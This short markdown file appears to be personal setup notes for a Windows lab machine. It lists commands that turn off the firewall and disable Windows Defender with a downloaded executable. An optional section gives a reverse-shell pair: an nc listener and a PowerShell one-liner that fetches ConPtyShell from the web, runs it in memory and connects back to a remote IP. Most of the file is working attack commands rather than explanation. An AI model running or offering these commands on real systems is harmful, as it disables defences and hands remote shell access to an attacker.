# download sysinternals, run edge + notepad

# set uac
```
set uac to default
```

# disable firewall
```
netsh advfirewall set allprofiles state off
```

# disable antivirus
```
login as Administrator, and disable all antivirus in settings and then
cd Desktop
wget https://github.com/pgkt04/defender-control/releases/download/v1.5/disable-defender.exe -o uwu.exe
.\uwu.exe
```

# optional raw colorful shell
```bash
stty raw -echo; (stty size; cat) | nc -lvnp 1337
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.5.30.50 1337
```